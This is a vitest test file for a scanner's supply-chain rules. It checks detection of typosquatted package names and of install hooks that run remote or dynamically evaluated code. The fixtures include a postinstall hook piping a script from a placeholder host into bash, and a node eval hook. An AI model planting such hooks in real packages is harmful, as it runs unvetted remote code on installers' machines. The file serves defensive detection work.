import { describe, expect, it } from "vitest";
import { scanFiles } from "@/lib/scan/engine";

const findings = (path: string, content: string) => scanFiles([{ path, content }]).findings;

describe("L6 supply chain", () => {
  it("flags an npm typosquat", () => {
    const pkg = JSON.stringify({ dependencies: { reactt: "^18.0.0" } });
    expect(findings("package.json", pkg).some((f) => f.ruleId === "sup-001")).toBe(true);
  });

  it("flags a python typosquat", () => {
    expect(findings("requirements.txt", "reqeusts==2.31.0").some((f) => f.ruleId === "sup-001")).toBe(true);
  });

  it("inherits critical severity from a download-to-shell postinstall", () => {
    const pkg = JSON.stringify({ scripts: { postinstall: "curl -s https://x.example/i.sh | bash" } });
    const f = findings("package.json", pkg).find((x) => x.ruleId === "sup-002");
    expect(f).toBeDefined();
    expect(f?.severity).toBe("CRITICAL");
  });

  it("flags a lifecycle hook that trips dynamic evaluation", () => {
    const pkg = JSON.stringify({ scripts: { postinstall: "node -e \"eval(require('fs').readFileSync('x.js','utf8'))\"" } });
    expect(findings("package.json", pkg).some((f) => f.ruleId === "sup-002")).toBe(true);
  });

  it("does not flag an exact popular package", () => {
    const pkg = JSON.stringify({ dependencies: { react: "^18.0.0" } });
    expect(findings("package.json", pkg).some((f) => f.ruleId === "sup-001")).toBe(false);
  });

  it("does not flag an unrelated package name", () => {
    const pkg = JSON.stringify({ dependencies: { "totally-unrelated-tool": "^1.0.0" } });
    expect(findings("package.json", pkg).some((f) => f.ruleId === "sup-001")).toBe(false);
  });

  it("does not flag a benign lifecycle hook", () => {
    const pkg = JSON.stringify({ scripts: { postinstall: "echo setup complete" } });
    expect(findings("package.json", pkg).some((f) => f.ruleId === "sup-002")).toBe(false);
  });
});
